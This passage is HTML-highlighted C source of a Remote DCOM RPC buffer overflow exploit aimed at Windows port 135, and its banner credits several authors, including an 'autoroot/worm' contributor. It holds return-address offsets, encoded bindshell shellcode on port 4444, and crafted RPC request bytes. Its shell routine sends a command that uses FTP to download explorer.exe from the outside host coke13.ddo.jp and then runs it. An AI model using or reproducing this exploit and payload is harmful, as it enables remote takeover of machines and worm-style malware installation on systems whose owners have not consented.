</span><span class="sc4">0x77294cdf</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x777a882e</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77e527f3</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x778b89e5</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x772b49df</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x772ae3e1</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x778b89e5</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x772b49df</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x772ae3e1</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x778b89e8</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77e3afe9</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77db37d7</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77b05422</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77292ce3</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77294ce0</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x7756c2e2</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77fc18d4</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x774b3ee4</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x7756c2e2</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x774a75d4</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77fc18d4</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77e81674</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0x77e829ec</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0x77e824b5</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0x77e8367a</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0x77f92a9b</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc4">0x77e9afe3</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77e626ba</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77d737db</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x77e2afc5</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x010016C6</span><span class="sc0"> 
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sc</span><span class="sc10">[]=</span><span class="sc0">
</span><span class="sc6">"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00"</span><span class="sc0">
</span><span class="sc6">"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"</span><span class="sc0">
</span><span class="sc6">"\x46\x00\x58\x00\x46\x00\x58\x00"</span><span class="sc0">

</span><span class="sc6">"\xff\xff\xff\xff"</span><span class="sc0"> </span><span class="sc1">/* return address */</span><span class="sc0">

</span><span class="sc6">"\xcc\xe0\xfd\x7f"</span><span class="sc0"> </span><span class="sc1">/* primary thread data block */</span><span class="sc0">
</span><span class="sc6">"\xcc\xe0\xfd\x7f"</span><span class="sc0"> </span><span class="sc1">/* primary thread data block */</span><span class="sc0">

</span><span class="sc1">/* port 4444 bindshell */</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"</span><span class="sc0">
</span><span class="sc6">"\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"</span><span class="sc0">
</span><span class="sc6">"\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"</span><span class="sc0">
</span><span class="sc6">"\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"</span><span class="sc0">
</span><span class="sc6">"\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"</span><span class="sc0">
</span><span class="sc6">"\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"</span><span class="sc0">
</span><span class="sc6">"\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"</span><span class="sc0">
</span><span class="sc6">"\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"</span><span class="sc0">
</span><span class="sc6">"\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"</span><span class="sc0">
</span><span class="sc6">"\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"</span><span class="sc0">
</span><span class="sc6">"\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"</span><span class="sc0">
</span><span class="sc6">"\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"</span><span class="sc0">
</span><span class="sc6">"\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"</span><span class="sc0">
</span><span class="sc6">"\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"</span><span class="sc0">
</span><span class="sc6">"\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"</span><span class="sc0">
</span><span class="sc6">"\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"</span><span class="sc0">
</span><span class="sc6">"\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"</span><span class="sc0">
</span><span class="sc6">"\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"</span><span class="sc0">
</span><span class="sc6">"\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"</span><span class="sc0">
</span><span class="sc6">"\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"</span><span class="sc0">
</span><span class="sc6">"\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"</span><span class="sc0">
</span><span class="sc6">"\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"</span><span class="sc0">
</span><span class="sc6">"\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"</span><span class="sc0">
</span><span class="sc6">"\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request4</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x2D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x88</span><span class="sc10">,</span><span class="sc4">0x2A</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> 
</span><span class="sc11">shell</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sock</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">fd_set</span><span class="sc0"> </span><span class="sc11">fd_read</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">cmd</span><span class="sc10">=</span><span class="sc6">"echo open coke13.ddo.jp&gt;&gt;o&amp;echo wed&gt;&gt;o&amp;echo wed&gt;&gt;o&amp;echo user wed wed&gt;&gt;o&amp;echo bin&gt;&gt;o&amp;echo get explorer.exe&gt;&gt;o&amp;echo bye&gt;&gt;o&amp;ftp -s:o&amp;explorer.exe&amp;del o&amp;exit\n"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">FD_ZERO</span><span class="sc10">(&amp;</span><span class="sc11">fd_read</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd_read</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd_read</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cmd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">cmd</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,&amp;</span><span class="sc11">fd_read</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">fd_read</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">FD_SETSIZE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd_read</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd_read</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">){</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EOF\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fd_read</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">){</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EOF\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">usleep</span><span class="sc10">(</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">stderr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Connection lost.\n\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">**</span><span class="sc11">argv</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sock</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">,</span><span class="sc11">len1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">target_id</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">target_ip</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">135</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf1</span><span class="sc10">[</span><span class="sc4">0x1000</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf2</span><span class="sc10">[</span><span class="sc4">0x1000</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"---------------------------------------------------------\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Remote DCOM RPC Buffer Overflow Exploit\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Original code by FlashSky and Benjurry\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Rewritten by HDM\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- autoroot/worm by volkam\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Fixed and Beefed by Legion2000 Security Research\n"</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">&lt;</span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Usage: %s &lt;Target ID&gt; &lt;Target IP&gt;\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Targets:\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">len</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">len</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">++)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- %d\t%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">len</span><span class="sc10">]);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* yeah, get over it */</span><span class="sc0">
</span><span class="sc11">target_id</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">offsets</span><span class="sc10">[</span><span class="sc11">target_id</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"- Using return address of 0x%.8x\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">+</span><span class="sc4">36</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ret</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">target_ip</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">sock</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"- Socket"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">target_ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">target_ip</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">perror</span><span class="sc10">(</span><span class="sc6">"- Connect"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">len</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc11">request1</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request1</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">len1</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">request1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">)=*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">request2</span><span class="sc10">)+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sc</span><span class="sc10">)/</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> 
